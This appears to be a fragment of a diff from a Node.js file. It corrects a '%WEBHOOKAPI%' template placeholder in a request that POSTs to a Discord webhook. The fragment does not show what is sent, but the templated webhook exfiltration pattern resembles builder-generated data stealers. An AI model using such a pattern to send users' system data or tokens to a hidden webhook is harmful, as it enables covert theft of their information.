@@ -552,7 +552,7 @@ const os = require("os");
           const options = {
             hostname: "discord.com",
             port: 443,
-            path: "/api/webhooks/" + "%WEBHOOKAPI",
+            path: "/api/webhooks/" + "%WEBHOOKAPI%",
             method: "POST",
             headers: {
               "Content-Type": "application/json",
